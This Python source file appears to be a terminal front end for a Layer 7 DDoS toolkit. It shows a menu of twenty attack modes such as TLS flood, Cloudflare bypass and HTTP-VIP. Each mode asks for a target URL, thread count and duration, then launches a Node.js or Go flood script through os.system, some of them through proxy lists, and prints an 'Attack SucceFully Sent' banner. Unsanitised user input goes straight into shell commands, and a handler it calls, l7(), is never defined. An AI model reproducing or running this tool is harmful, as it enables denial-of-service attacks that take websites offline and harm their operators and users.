import os
import time
from rich.panel import Panel
from rich.tree import Tree
from rich import print as prints
from rich.console import Console
from rich import print as cetak
from rich.table import Table
import random 
from rich import box
from rich.columns import Columns
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
pornhub = []
##----------[ WARNA PRINT RICH ]---------- ###
M2 = "[#FF0000]" # BIRU
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # MERAH
B2 = "[#00C8FF]" # BIRU
P2 = "[#FFFFFF]" # PUTIH
U2 = '\x1b[1;96m'  # UNGU
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
J = '\033[38;2;255;127;0;1m' # ORANGE
N = '\x1b[0m' # WARNA MATI
red = '\033[1;91m'
white = '\033[0m'
green = '\033[1;32m'
yellow = '\033[1;33m'
blue = '\033[1;34m'
red_t = '\033[0;31;40m'
gray = '\033[1;37;40m'
gold = '\033[0;33m'
###----------[ CEK WARNA TEMA ]---------- ###
try:
	file_color = open("data/theme_color","r").read()
	color_text = file_color.split("|")[0]
	color_panel = file_color.split("|")[1]
except:
	color_text = "[#00FF00]"
	W1 = random.choice([M2,H2,K2])
	W2 = random.choice([K2,M2,K2])
	W3 = random.choice([H2,K2,M2])
	color_panel = "#00FFFF"
	color_ok = "#00FF00"
	color_cp = "#FFFF00"
def main():
    os.system("python DarkStar.py")
    
def ErrorChoiceStart():
    print(f"\n{M} Invalid Choice !")
    time.sleep(1)
    
def clear():
    os.system("cls" if os.name == "nt" else "clear")
    
def success():
    print (f"""
                  \x1b[38;2;255;0;255m╔\x1b[38;2;237;18;255m═\x1b[38;2;231;24;255m╗\x1b[38;2;225;30;255m╔╦\x1b[38;2;219;36;255m╗\x1b[38;2;213;42;255m╔\x1b[38;2;207;48;255m╦╗\x1b[38;2;201;54;255m╔═\x1b[38;2;195;60;255m╗\x1b[38;2;189;66;255m╔═\x1b[38;2;183;72;255m╗\x1b[38;2;177;78;255m╦\x1b[38;2;171;84;255m╔\x1b[38;2;165;90;255m═  \x1b[38;2;159;96;255m╔\x1b[38;2;153;102;255m═\x1b[38;2;147;108;255m╗\x1b[38;2;141;114;255m╔\x1b[38;2;135;120;255m═\x1b[38;2;129;126;255m╗\x1b[38;2;123;132;255m╔\x1b[38;2;117;138;255m╗\x1b[38;2;111;144;255m╔\x1b[38;2;87;168;255m╔\x1b[38;2;81;174;255m╦\x1b[38;2;75;180;255m╗
                  \x1b[38;2;255;0;255m╠\x1b[38;2;237;18;255m═\x1b[38;2;231;24;255m╣ \x1b[38;2;225;30;255m║  \x1b[38;2;219;36;255m║ \x1b[38;2;213;42;255m╠═\x1b[38;2;207;48;255m╣\x1b[38;2;201;54;255m║  \x1b[38;2;195;60;255m╠\x1b[38;2;189;66;255m╩\x1b[38;2;183;72;255m╗ \x1b[38;2;177;78;255m ╚\x1b[38;2;171;84;255m═\x1b[38;2;165;90;255m╗\x1b[38;2;159;96;255m║\x1b[38;2;153;102;255m╣\x1b[38;2;147;108;255m ║\x1b[38;2;141;114;255m║\x1b[38;2;135;120;255m║\x1b[38;2;75;180;255m ║\x1b[38;2;75;180;255m║
                  \x1b[38;2;255;0;255m╩ \x1b[38;2;237;18;255m╩ \x1b[38;2;231;24;255m╩ \x1b[38;2;225;30;255m ╩ \x1b[38;2;219;36;255m╩ \x1b[38;2;213;42;255m╩\x1b[38;2;207;48;255m╚═\x1b[38;2;201;54;255m╝\x1b[38;2;195;60;255m╩ \x1b[38;2;189;66;255m╩  \x1b[38;2;183;72;255m╚\x1b[38;2;177;78;255m═\x1b[38;2;171;84;255m╝\x1b[38;2;165;90;255m╚\x1b[38;2;159;96;255m═\x1b[38;2;153;102;255m╝\x1b[38;2;147;108;255m╝\x1b[38;2;141;114;255m╚\x1b[38;2;135;120;255m╝\x1b[38;2;87;168;255m═\x1b[38;2;75;180;255m╩\x1b[38;2;75;180;255m╝
                \x1b[38;2;243;12;255m╚╦\x1b[38;2;237;18;255m══\x1b[38;2;231;24;255m══\x1b[38;2;225;30;255m══\x1b[38;2;219;36;255m══\x1b[38;2;213;42;255m══\x1b[38;2;207;48;255m══\x1b[38;2;201;54;255m═\x1b[38;2;195;60;255m═\x1b[38;2;189;66;255m═\x1b[38;2;183;72;255m═\x1b[38;2;177;78;255m═\x1b[38;2;171;84;255m═\x1b[38;2;165;90;255m═\x1b[38;2;159;96;255m═\x1b[38;2;153;102;255m═\x1b[38;2;147;108;255m═\x1b[38;2;141;114;255m═\x1b[38;2;135;120;255m═\x1b[38;2;129;126;255m═\x1b[38;2;123;132;255m═\x1b[38;2;117;138;255m═\x1b[38;2;111;144;255m═\x1b[38;2;105;150;255m═\x1b[38;2;99;156;255m═\x1b[38;2;93;162;255m═\x1b[38;2;87;168;255m═\x1b[38;2;81;174;255m╦\x1b[38;2;75;180;255m╝
           \x1b[38;2;243;12;255m╔═════╩\x1b[38;2;237;18;255m══\x1b[38;2;231;24;255m══\x1b[38;2;225;30;255m══\x1b[38;2;219;36;255m══\x1b[38;2;213;42;255m══\x1b[38;2;207;48;255m══\x1b[38;2;201;54;255m═\x1b[38;2;195;60;255m═\x1b[38;2;189;66;255m═\x1b[38;2;183;72;255m═\x1b[38;2;177;78;255m═\x1b[38;2;171;84;255m═\x1b[38;2;165;90;255m═\x1b[38;2;159;96;255m═\x1b[38;2;153;102;255m═\x1b[38;2;147;108;255m═\x1b[38;2;141;114;255m═\x1b[38;2;135;120;255m═\x1b[38;2;129;126;255m═\x1b[38;2;123;132;255m═\x1b[38;2;117;138;255m═\x1b[38;2;111;144;255m═\x1b[38;2;105;150;255m═\x1b[38;2;99;156;255m═\x1b[38;2;93;162;255m═\x1b[38;2;87;168;255m═\x1b[38;2;81;174;255m╩═\x1b[38;2;75;180;255m════╗
                    🚀 \x1b[38;2;0;255;255mAttack SucceFully Sent 🚀
                   
               \x1b[38;2;243;12;255mT\x1b[38;2;255;0;255mA\x1b[38;2;231;24;255mR\x1b[38;2;225;30;255mG\x1b[38;2;219;36;255mE\x1b[38;2;189;66;255mT   : \033[1;91m[ \033[1;37m{url}\033[1;91m ]
               \x1b[38;2;243;12;255mP\x1b[38;2;255;0;255mO\x1b[38;2;231;24;255mR\x1b[38;2;225;30;255mT     : \033[1;91m[ \033[1;37m443\033[1;91m ]
               \x1b[38;2;243;12;255mT\x1b[38;2;255;0;255mI\x1b[38;2;231;24;255mM\x1b[38;2;225;30;255mE     : \033[1;91m[\033[1;37m {w} \033[1;91m]
               \x1b[38;2;243;12;255mM\x1b[38;2;255;0;255mET\x1b[38;2;231;24;255mH\x1b[38;2;225;30;255mO\x1b[38;2;219;36;255mD\x1b[38;2;189;66;255mS  : \033[1;91m[ \033[1;37m{mode}\033[1;91m ]
               \x1b[38;2;243;12;255mS\x1b[38;2;255;0;255mE\x1b[38;2;231;24;255mN\x1b[38;2;225;30;255mT B\x1b[38;2;219;36;255mY  : \033[1;91m[\033[1;37m Admin \033[1;91m]
               \x1b[38;2;243;12;255mV\x1b[38;2;231;24;255mI\x1b[38;2;225;30;255mP      : [\x1b[38;2;0;212;14mTrue\x1b[38;2;255;255;255m]
               
           \x1b[38;2;243;12;255m╚══════\x1b[38;2;237;18;255m══\x1b[38;2;231;24;255m══\x1b[38;2;225;30;255m══\x1b[38;2;219;36;255m══\x1b[38;2;213;42;255m══\x1b[38;2;207;48;255m══\x1b[38;2;201;54;255m═\x1b[38;2;195;60;255m═\x1b[38;2;189;66;255m═\x1b[38;2;183;72;255m═\x1b[38;2;177;78;255m═\x1b[38;2;171;84;255m═\x1b[38;2;165;90;255m═\x1b[38;2;159;96;255m═\x1b[38;2;153;102;255m═\x1b[38;2;147;108;255m═\x1b[38;2;141;114;255m═\x1b[38;2;135;120;255m═\x1b[38;2;129;126;255m═\x1b[38;2;123;132;255m═\x1b[38;2;117;138;255m═\x1b[38;2;111;144;255m═\x1b[38;2;105;150;255m═\x1b[38;2;99;156;255m═\x1b[38;2;93;162;255m═\x1b[38;2;87;168;255m═\x1b[38;2;81;174;255m══\x1b[38;2;75;180;255m════╝\x1b[0m
                   
""")
clear()
print(f"""{M}
                ░░░░░░░░░░                     
          ░░▒▓██████████████▓▒░░░              
      ░░▓███████████████████████▓▒░            
    ░▓█████████████████████████████▓░░         
  ░▓██████████████████████████████████░░       
░░▒█████████████████████████████████████▓░░     
░▒████████████████████████████████████████▒░    
▒██████████████████████████████████████████▒░   
░███████████████████████████████████████████▓    
▒███████████████████████████████████████████▓    
░███████████████████████████████████████████▒░   
░███████████████████████████████████████████░    
▒██████████████████████████████████████████░    
░█████████████████████████████████████████▒░    
░████████▓▓█░▒██████████████▓░▒▓▒█████████▒     
░█████░░░░▒▓░░▒░░▒█████████░░ ░▒░██░▒█████▒     
▒████▒░          ░▒██████▒▓░    ░██░░▓████▓░    
░████▒░         ░░▓██████▒░      ▓▒░░█████▒     
░▒████░░      ░░░███▒█░▓██▒░       ░▓█████░     
░▒█████▓▒░   ░░▓████░█░▒████▓░░░ ░▒███████▒     
░▒████████████████▒▒░█░░▓█████████████████░     
░░▒███████████████░  ░░░▒████████████████▒░     
 ░▒█████████████▓░ ░█▒░░▓██████████████▓░      
  ░▒████▒░███████░░░██░▒███████▒▒███▓▓▓░       
   ░██▓▓░░▓████████████████████▒░ ▒▓░░░░       
   ░▓█░ ░▒█████████████████████▒░ ▒▓░          
    ▒█   ░▓████████████████████░               
    ▒█    ▒████████████████▓██▓░               
    ░░    ░░██▓██▒██▓███▓▓█░▓█▓░               
           ░██▒██▒▒█░███▓░█░▒█▒░               
           ░██░▒█▒░▒░███▓░▓░▒█▒░               
           ░██ ░░░  ░███▓░ ░░▓░                
           ░██      ░▒█▓▓░  ░░░                
            ▓█░     ░▒█░░░                     
            ▒█░     ░▒█░                       
            ░█░     ░▒▓░                       
                    ░░▓░                       
""")   
print(f"""
{U2}╔═══════════════════════════════════════╗
║                  Menu                 ║
{U2}╔═══════════════════════════════════════╗
{U2}║{M}  [{N}01{M}] {U2}║ {N}TLS                          {U2} ║
{U2}║{M}  [{N}02{M}] {U2}║ {N}LC                          {U2}  ║
{U2}║{M}  [{N}03{M}] {U2}║ {N}GOD                           {U2}║
{U2}║{M}  [{N}04{M}] {U2}║ {N}BYPASS                       {U2} ║
{U2}║{M}  [{N}05{M}] {U2}║ {N}HTTPS                        {U2} ║
{U2}║{M}  [{N}06{M}] {U2}║ {N}MIX                          {U2} ║
{U2}║{M}  [{N}07{M}] {U2}║ {N}CF-BYPASS                  {U2}   ║
{U2}║{M}  [{N}08{M}] {U2}║ {N}BROSWER                   {U2}    ║
{U2}║{M}  [{N}09{M}] {U2}║ {N}POST                        {U2}  ║
{U2}║{M}  [{N}10{M}] {U2}║ {N}SUPER                        {U2} ║
{U2}║{M}  [{N}11{M}] {U2}║ {N}STRESS                      {U2}  ║
{U2}║{M}  [{N}12{M}] {U2}║ {N}FLOOD                       {U2}  ║
{U2}║{M}  [{N}13{M}] {U2}║ {N}TLS-FOCKED                   {U2} ║
{U2}║{M}  [{N}14{M}] {U2}║ {N}TLS-PRO                      {U2} ║
{U2}║{M}  [{N}15{M}] {U2}║ {N}TLSV2                        {U2} ║
{U2}║{M}  [{N}16{M}] {U2}║ {N}HTTP-MARS                    {U2} ║
{U2}║{M}  [{N}17{M}] {U2}║ {N}HTTP-VIP                     {U2} ║
{U2}║{M}  [{N}18{M}] {U2}║ {N}XXX                          {U2} ║
{U2}║{M}  [{N}19{M}] {U2}║ {N}TLS-TELEDOG                  {U2} ║
{U2}║{M}  [{N}20{M}] {U2}║ {N}TLS-VIP                       {U2}║
{U2}╚═══════════════════════════════════════╝
""")

while True:
    menu = input("\x1b[38;2;239;239;239m┏━━[\x1b[38;2;255;99;71mRoot\x1b[38;2;239;239;239m] ● [\x1b[1;91mLayer7\x1b[38;2;239;239;239m]\n\x1b[38;2;239;239;239m┗━━➤ ")
    if menu in["1","01"]:
         try:
              url = input("Target Url : ")
              threads = input("Threads : ")
              w = input("Time : ")
              mode = "TLS"
              print("Attacking...")
              os.system(f'node ./DDOS/Layer7/TLS.js {url} {w} 500 {threads}')
              time.sleep(20)
              clear()
              success()
         except ValueError:
                l7()
         except IndexError:
                l7()
    elif menu in["2","02"]:
         try:
              url = input("Target Url : ")
              threads = input("Threads : ")
              w = input("Time : ")
              mode = "LC"
              print("Attacking...")
              os.system(f'node ./DDOS/Layer7/LC.js {url} {w} 500 {threads} proxy6.txt')
              clear()
              success()
         except ValueError:
                l7()
         except IndexError:
                l7()
    elif menu in["3","03"]:
         try:
              url = input("Target Url : ")
              threads = input("Threads : ")
              w = input("Time : ")
              mode = "GOD"
              print("Attacking...")
              os.system(f'node ./DDOS/Layer7/GOD.js {url} {w} 500 {threads} 500 proxy4.txt')

              time.sleep(20)
              clear()
              success()
         except ValueError:
                l7()
         except IndexError:
                l7()
    elif menu in["4","04"]:
         try:
              url = input("Target Url : ")
              threads = input("Threads : ")
              w = input("Time : ")
              mode = "BYPASS"
              print("Attacking...")
              os.system(f'node ./DDOS/Layer7/BYPASS.js {url} {w} 500 {threads} proxy.txt')

              time.sleep(20)
              clear()
              success()
         except ValueError:
                l7()
         except IndexError:
                l7()
    elif menu in["5","05"]:
         try:
              url = input("Target Url : ")
              r = input("Rate : ")
              threads = input("Threads : ")
              w = input("Time : ")
              mode = "HTTPS"
              print("Attacking...")
              os.system(f'node ./DDOS/Layer7/HTTPS.js {url} {w} {r} {threads} proxy1.txt')

              time.sleep(20)
              clear()
              success()
         except ValueError:
                l7()
         except IndexError:
                l7()
    elif menu in["6","06"]:
         try:
              url = input("Target Url : ")
              threads = input("Threads : ")
              w = input("Time : ")
              mode = "MIX"
              print("Attacking...")
              os.system(f'node ./DDOS/Layer7/MIX.js {url} {w} 500 {threads}')

              time.sleep(20)
              clear()
              success()
         except ValueError:
                l7()
         except IndexError:
                l7()
    elif menu in["7","07"]:
         try:
              url = input("Target Url : ")
              threads = input("Threads : ")
              w = input("Time : ")
              mode = "CF-BYPASS"
              print("Attacking...")
              os.system(f'node ./DDOS/Layer7/CF-BYPASS.js {url} {w} 500 {threads} proxy.txt')

              time.sleep(20)
              clear()
              success()
         except ValueError:
                l7()
         except IndexError:
                l7()
    elif menu in["8","08"]:
         try:
              url = input("Target Url : ")
              threads = input("Threads : ")
              w = input("Time : ")
              mode = "BROWSER"
              print("Attacking...")
              os.system(f'node ./DDOS/Layer7/BROWSER.js {url} {threads} {w}')

              time.sleep(20)
              clear()
              success()
         except ValueError:
                l7()
         except IndexError:
                l7()
    elif menu in["9","09"]:
         try:
              url = input("Target Url : ")
              threads = input("Threads : ")
              w = input("Time : ")
              mode = "POST"
              print("Attacking...")
              os.system(f'node ./DDOS/Layer7/POST.js {url} {threads} {w}')

              time.sleep(20)
              clear()
              success()
         except ValueError:
                l7()
         except IndexError:
                l7()
    elif menu == "10":
         try:
              url = input("Target Url : ")
              threads = input("Threads : ")
              w = input("Time : ")
              mode = "SUPER"
              print("Attacking...")
              os.system(f'node ./DDOS/Layer7/SUPER.js {url} {w} {threads} proxy.txt 300')

              time.sleep(20)
              clear()
              success()
         except ValueError:
                l7()
         except IndexError:
                l7()
    elif menu == "11":
         try:
              url = input("Target Url : ")
              w = input("Time : ")
              mode = "STRESS"
              print("Attacking...")
              os.system(f'go run ./DDOS/Layer7/STRESS.go --host {url} --time {w}s')

              time.sleep(20)
              clear()
              success()
         except ValueError:
                l7()
         except IndexError:
                l7()
    elif menu == "12":
         try:
              url = input("Target Url : ")
              threads = input("Threads : ")
              w = input("Time : ")
              mode = "FLOOD"
              print("Attacking...")
              os.system(f'node ./DDOS/Layer7/FLOOD.js {url} {w} 300 {threads} proxy.txt')

              time.sleep(20)
              clear()
              success()
         except ValueError:
                l7()
         except IndexError:
                l7()
    elif menu == "13":
         try:
              url = input("Target Url : ")
              threads = input("Threads : ")
              w = input("Time : ")
              mode = "TLS-FOCKED"
              print("Attacking...")
              os.system(f'node ./DDOS/Layer7/TLS-FOCKET.js {url} {w} 500 {threads} proxy.txt')

              time.sleep(20)
              clear()
              success()
         except ValueError:
                l7()
         except IndexError:
                l7()
    elif menu == "14":
         try:
              url = input("Target Url : ")
              prox = input("PROXY : ")
              w = input("Time : ")
              mode = "TLS-PRO"
              print("Attacking...")
              os.system(f'node ./DDOS/Layer7/TLS-PRO.js {url} {prox} {w}')

              time.sleep(20)
              clear()
              success()
         except ValueError:
                l7()
         except IndexError:
                l7()
    elif menu == "15":
         try:
              url = input("Target Url : ")
              threads = input("Threads : ")
              w = input("Time : ")
              mode = "TLSV2"
              print("Attacking...")
              os.system(f'node ./DDOS/Layer7/TLSV2.js {url} {w} 300 {threads} proxy.txt')

              time.sleep(20)
              clear()
              success()
         except ValueError:
                l7()
         except IndexError:
                l7()
    elif menu == "16":
         try:
              url = input("Target Url : ")
              threads = input("Threads : ")
              w = input("Time : ")
              mode = "HTTP-MARS"
              print("Attacking...")
              os.system(f'node ./DDOS/Layer7/HTTP-MARS.js {url} {w} 500 {threads} proxy.txt')

              time.sleep(20)
              clear()
              success()
         except ValueError:
                l7()
         except IndexError:
                l7()
    elif menu == "17":
         try:
              url = input("Target Url : ")
              threads = input("Threads : ")
              w = input("Time : ")
              mode = "HTTP-VIP"
              print("Attacking...")
              os.system(f'node ./DDOS/Layer7/HTTP-VIP.js {url} {w} 500 {threads} proxy.txt')

              time.sleep(20)
              clear()
              success()
         except ValueError:
                l7()
         except IndexError:
                l7()
    elif menu == "18":
         try:
              url = input("Target Url : ")
              threads = input("Threads : ")
              w = input("Time : ")
              prox = input("Proxy : ")
              mode = "XXX"
              print("Attacking...")
              os.system(f'node ./DDOS/Layer7/XXX.js {url} {prox} {w}')

              time.sleep(20)
              clear()
              success()
         except ValueError:
                l7()
         except IndexError:
                l7()
    elif menu == "19":
         try:
              url = input("Target Url : ")
              threads = input("Threads : ")
              w = input("Time : ")
              mode = "TLS-TELEDOG"
              print("Attacking...")
              os.system(f'node ./DDOS/Layer7/TLS-TELEDOG.js {url} {w} 500 {threads} proxy.txt')
              time.sleep(20)
              clear()
              success()
         except ValueError:
                l7()
         except IndexError:
                l7()
    elif menu == "20":
         try:
              url = input("Target Url : ")    
              w = input("Time : ")
              r = input("Rate : ")
              threads = input("Threads : ")
              prox = input("Proxy : ")
              mode = "TLS-VIP"
              print("Attacking...")
              os.system(f'node ./DDOS/Layer7/TLS-VIP.js {url} {w} {r} {threads} {prox}')

              time.sleep(20)
              clear()
              success()
         except ValueError:
                l7()
         except IndexError:
                l7()
    else:
      ErrorChoiceStart()
      os.system("python ./DDOS/Layer7/main.py")